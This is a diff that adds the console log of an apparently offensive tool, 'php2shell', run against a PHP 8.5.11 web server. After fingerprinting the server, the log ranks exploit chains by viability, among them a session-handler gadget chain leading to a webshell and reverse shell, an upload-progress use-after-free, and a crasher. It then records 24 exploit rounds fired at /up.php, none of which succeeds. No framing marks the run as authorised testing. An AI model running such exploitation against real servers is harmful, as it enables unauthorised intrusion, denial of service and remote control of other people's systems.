@@ -1,0 +1,48 @@
+php2shell 1.0.0 — recon
+============================================================
+[+] X-Powered-By: PHP/8.5.11
+[*] multipart probe: 200 (0.00s)
+[*] fingerprinted: PHP 8.5.11
+============================================================
+CHAINS (post-recon viability for this target):
+  [sessgap  ] VIABLE  session serialize_handler gap -> key injection -> gadget -> webshell -> revshell
+        -> fires on ANY PHP version given the write/read handler divergence + an app destructor gadget (this is an app-config bug class, not a memory bug)
+  [zero4    ] N/A      (not a remote target)
+  [zero5    ] N/A      (not a remote target)
+  [uprog    ] VIABLE  rfc1867 upload-progress UAF arms (kill manifests)
+        -> PHP 8.5.11 <= 8.5.12 without the Oct-2026 patch (jammy 8.1.2-1ubuntu2.27 fleet + <=8.5.11 vanilla receipted; 8.3.36+/8.4.27+ have the patch)
+  [cformat  ] VIABLE  C: format internal-class crasher
+        -> crash/DoS class — needs an unserialize endpoint on target
+  [nativephp] NOT      NativePHP bridge: File.Copy -> AsyncTask spool poison -> unserialize
+        -> needs --native-bridge URL (the /_native/api/* surface)
+  [win-sess ] NOT      Windows session O_NOFOLLOW=0 file truncation
+        -> Windows victims only — this target is not Windows
+============================================================
+
+=== FIRE: [uprog] rfc1867 upload-progress UAF arms (kill manifests) ===
+[*] uprog arms at /up.php (shapes [150, 250, 350, 450], 24 rounds)
+    arm#0 fs=150 -> 200
+    arm#1 fs=250 -> 200
+    arm#2 fs=350 -> 200
+    arm#3 fs=450 -> 200
+    arm#4 fs=150 -> 200
+    arm#5 fs=250 -> 200
+    arm#6 fs=350 -> 200
+    arm#7 fs=450 -> 200
+    arm#8 fs=150 -> 200
+    arm#9 fs=250 -> 200
+    arm#10 fs=350 -> 200
+    arm#11 fs=450 -> 200
+    arm#12 fs=150 -> 200
+    arm#13 fs=250 -> 200
+    arm#14 fs=350 -> 200
+    arm#15 fs=450 -> 200
+    arm#16 fs=150 -> 200
+    arm#17 fs=250 -> 200
+    arm#18 fs=350 -> 200
+    arm#19 fs=450 -> 200
+    arm#20 fs=150 -> 200
+    arm#21 fs=250 -> 200
+    arm#22 fs=350 -> 200
+    arm#23 fs=450 -> 200
+[-] no kill signature in budget — target patched or shapes need tuning (jammy fleet + <=8.5.11 vanilla are the receipted classes)
